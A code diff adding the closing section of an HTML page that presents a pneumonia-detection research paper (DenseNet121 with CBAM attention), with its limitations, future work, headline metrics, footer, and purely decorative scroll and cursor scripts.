+          <span>Parameter efficiency: superior AUC at 31% of ResNet50 parameter cost (8M vs 25.6M)</span>
+        </li>
+        <li style="counter-increment: item; display: flex; gap: 10px;">
+          <span style="font-weight: 700; color: var(--accent); flex-shrink: 0;">[6]</span>
+          <span>Structured Grad-CAM failure-mode taxonomy (3 clinically relevant categories)</span>
+        </li>
+        <li style="counter-increment: item; display: flex; gap: 10px;">
+          <span style="font-weight: 700; color: var(--accent); flex-shrink: 0;">[7]</span>
+          <span>Rigorous multi-baseline comparative evaluation under identical experimental settings</span>
+        </li>
+      </ul>
+    </div>
+    <div class="glass content-box">
+      <h3>Acknowledged Limitations</h3>
+      <ul>
+        <li>Dataset limited to pediatric patients (1-5 years) from single Chinese institution</li>
+        <li>Binary classification only; no bacterial vs viral pneumonia distinction</li>
+        <li>CPU hardware constrains batch size and hyperparameter exploration</li>
+        <li>Grad-CAM provides coarse spatial localization without pixel-wise segmentation</li>
+        <li>No external validation on adult cohorts or different imaging protocols</li>
+        <li>37.2% false positive rate may strain clinical workflow in low-prevalence settings</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="timeline reveal">
+    <div class="timeline-item">
+      <div class="timeline-title">Multi-Institutional Validation</div>
+      <div class="timeline-content">
+        <p>Evaluate on diverse cohorts (adult patients, multiple ethnicities, different equipment manufacturers) to assess generalizability beyond single pediatric dataset. Partner with hospitals in North America, Europe, and Africa for multi-site clinical trials.</p>
+      </div>
+    </div>
+
+    <div class="timeline-item">
+      <div class="timeline-title">Multi-Class Extension</div>
+      <div class="timeline-content">
+        <p>Extend from binary to multi-class classification: <strong>normal</strong>, <strong>bacterial pneumonia</strong>, <strong>viral pneumonia</strong>, and <strong>COVID-19 pneumonitis</strong>. Requires reannotation of dataset by radiologists with pathology-confirmed ground truth.</p>
+      </div>
+    </div>
+
+    <div class="timeline-item">
+      <div class="timeline-title">Vision Transformer Integration</div>
+      <div class="timeline-content">
+        <p>Evaluate <strong>Vision Transformer (ViT)</strong> and hybrid <strong>CNN-ViT</strong> architectures (e.g., Swin Transformer, CoAtNet). Transformers may capture long-range dependencies better than CNNs, potentially improving detection of diffuse infiltrates.</p>
+      </div>
+    </div>
+
+    <div class="timeline-item">
+      <div class="timeline-title">Clinical Metadata Integration</div>
+      <div class="timeline-content">
+        <p>Augment imaging with auxiliary clinical variables: patient age, oxygen saturation (SpO₂), fever duration, white blood cell count. Multi-modal fusion could improve diagnostic accuracy beyond image-only models.</p>
+      </div>
+    </div>
+
+    <div class="timeline-item">
+      <div class="timeline-title">Model Deployment & Optimization</div>
+      <div class="timeline-content">
+        <p>Convert to <strong>ONNX</strong> format and optimize with <strong>TensorRT</strong> for deployment on mobile devices and edge hardware. Target: <100ms inference latency on smartphone-grade processors for point-of-care screening in resource-limited settings.</p>
+      </div>
+    </div>
+
+    <div class="timeline-item">
+      <div class="timeline-title">Enhanced Explainability</div>
+      <div class="timeline-content">
+        <p>Implement <strong>Grad-CAM++</strong> for higher-resolution attention maps and <strong>Layer-wise Relevance Propagation (LRP)</strong> for pixel-wise attribution. Validate localization accuracy against radiologist-annotated segmentation masks.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="stats-grid reveal">
+    <div class="glass stat-card" style="border-top: 4px solid var(--green);">
+      <div class="stat-number">96.2%</div>
+      <div class="stat-label">Sensitivity</div>
+      <div class="stat-desc">High Recall for Pneumonia</div>
+    </div>
+    <div class="glass stat-card" style="border-top: 4px solid var(--accent);">
+      <div class="stat-number">0.9275</div>
+      <div class="stat-label">ROC-AUC</div>
+      <div class="stat-desc">Overall Discrimination</div>
+    </div>
+    <div class="glass stat-card" style="border-top: 4px solid var(--gold);">
+      <div class="stat-number">0.9318</div>
+      <div class="stat-label">Avg Precision</div>
+      <div class="stat-desc">Precision-Recall AUC</div>
+    </div>
+    <div class="glass stat-card" style="border-top: 4px solid var(--accent3);">
+      <div class="stat-number">8M</div>
+      <div class="stat-label">Parameters</div>
+      <div class="stat-desc">Efficient Architecture</div>
+    </div>
+  </div>
+
+  <div class="highlight-box reveal">
+    <h4>Impact Statement</h4>
+    <p>This work demonstrates that attention-augmented CNNs can achieve clinical-grade pneumonia detection with significantly fewer parameters than standard architectures, making deployment feasible on resource-constrained devices. The 96.2% sensitivity meets the threshold for triage tools in low-resource settings, where the cost of missing a pneumonia case far exceeds the cost of unnecessary follow-up testing. By combining quantitative performance metrics with qualitative explainability analysis, we provide a template for responsible AI development in medical imaging—balancing accuracy, efficiency, and interpretability in a manner conducive to clinical adoption and regulatory approval.</p>
+  </div>
+</section>
+
+</main>
+
+<!-- ════════════════════════ FOOTER ════════════════════════ -->
+<footer>
+  <div class="f-title">An Explainable DenseNet121 Framework with CBAM Attention and Focal Loss for Pneumonia Detection</div>
+  <div class="f-sub">Khirabdi Tanaya Patri · Bhubesh A K · Abhishek N Tripathi — VIT Vellore, School of Electronics Engineering</div>
+  <div class="f-meta">
+    <span>IEEE Access Submission</span>
+    <span>DOI: 10.1109/ACCESS.2017.DOI</span>
+    <span>Dataset: Kaggle Chest X-Ray (5,856 images)</span>
+    <span>Framework: PyTorch 2.2.0</span>
+    <span>Hardware: Intel Core i7 CPU</span>
+    <span>No External Funding</span>
+  </div>
+</footer>
+
+<script>
+// ══════════════ CUSTOM CURSOR ══════════════
+const dot = document.getElementById('cursor-dot');
+const ring = document.getElementById('cursor-ring');
+let mx = 0, my = 0, rx = 0, ry = 0;
+
+document.addEventListener('mousemove', e => {
+  mx = e.clientX; my = e.clientY;
+  dot.style.left = mx + 'px';
+  dot.style.top = my + 'px';
+});
+
+function animRing() {
+  rx += (mx - rx) * 0.15;
+  ry += (my - ry) * 0.15;
+  ring.style.left = rx + 'px';
+  ring.style.top = ry + 'px';
+  requestAnimationFrame(animRing);
+}
+animRing();
+
+document.querySelectorAll('a, button, .stat-card, .arch-block, .glass, .image-card, th, td').forEach(el => {
+  el.addEventListener('mouseenter', () => document.body.classList.add('cursor-grow'));
+  el.addEventListener('mouseleave', () => document.body.classList.remove('cursor-grow'));
+});
+
+// ══════════════ FLOATING PARTICLES ══════════════
+function createParticles() {
+  const colors = [
+    'rgba(37,99,235,0.18)', 
+    'rgba(14,165,233,0.15)', 
+    'rgba(99,102,241,0.15)', 
+    'rgba(16,185,129,0.12)',
+    'rgba(245,158,11,0.12)'
+  ];
+  for (let i = 0; i < 25; i++) {
+    const p = document.createElement('div');
+    p.className = 'particle';
+    const size = Math.random() * 7 + 3;
+    p.style.cssText = `
+      width:${size}px; height:${size}px;
+      background:${colors[Math.floor(Math.random()*colors.length)]};
+      left:${Math.random()*100}%;
+      animation-duration:${Math.random()*25+20}s;
+      animation-delay:${Math.random()*-25}s;
+    `;
+    document.body.appendChild(p);
+  }
+}
+createParticles();
+
+// ══════════════ REVEAL ON SCROLL ══════════════
+const reveals = document.querySelectorAll('.reveal');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach((entry, i) => {
+    if (entry.isIntersecting) {
+      setTimeout(() => entry.target.classList.add('visible'), i * 100);
+      observer.unobserve(entry.target);
+    }
+  });
+}, { threshold: 0.1 });
+reveals.forEach(el => observer.observe(el));
+
+// ══════════════ ANIMATE METRIC BARS ══════════════
+const barObserver = new IntersectionObserver(entries => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.style.animationPlayState = 'running';
+    }
+  });
+}, { threshold: 0.2 });
+document.querySelectorAll('.metric-bar-fill').forEach(el => {
+  el.style.animationPlayState = 'paused';
+  barObserver.observe(el);
+});
+
+// ══════════════ ANTI-GRAVITY FLOAT EFFECT ══════════════
+document.querySelectorAll('.stat-card, .arch-block, .image-card').forEach(card => {
+  card.addEventListener('mousemove', e => {
+    const rect = card.getBoundingClientRect();
+    const cx = rect.left + rect.width / 2;
+    const cy = rect.top + rect.height / 2;
+    const dx = (e.clientX - cx) / (rect.width / 2);
+    const dy = (e.clientY - cy) / (rect.height / 2);
+    card.style.transform = `perspective(1000px) translateY(-6px) rotateX(${-dy * 10}deg) rotateY(${dx * 10}deg) scale(1.02)`;
+    card.style.transition = 'transform 0.1s ease';
+  });
+  card.addEventListener('mouseleave', () => {
+    card.style.transform = '';
+    card.style.transition = 'transform 0.5s cubic-bezier(.25,.46,.45,.94)';
+  });
+});
+
+// ══════════════ NAVIGATION ACTIVE STATE ══════════════
+const sections = document.querySelectorAll('section[id]');
+const navLinks = document.querySelectorAll('.nav-links a');
+window.addEventListener('scroll', () => {
+  let current = '';
+  sections.forEach(s => {
+    if (window.scrollY >= s.offsetTop - 200) current = s.getAttribute('id');
+  });
+  navLinks.forEach(a => {
+    const isActive = a.getAttribute('href') === '#' + current;
+    a.style.background = isActive ? 'rgba(37,99,235,0.1)' : '';
+    a.style.color = isActive ? 'var(--accent)' : '';
+    a.style.fontWeight = isActive ? '600' : '';
+  });
+});
+
+// ══════════════ SMOOTH SCROLL ENHANCEMENT ══════════════
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+  anchor.addEventListener('click', function (e) {
+    e.preventDefault();
+    const target = document.querySelector(this.getAttribute('href'));
+    if (target) {
+      target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+  });
+});
+</script>
+
 </body>
 </html>
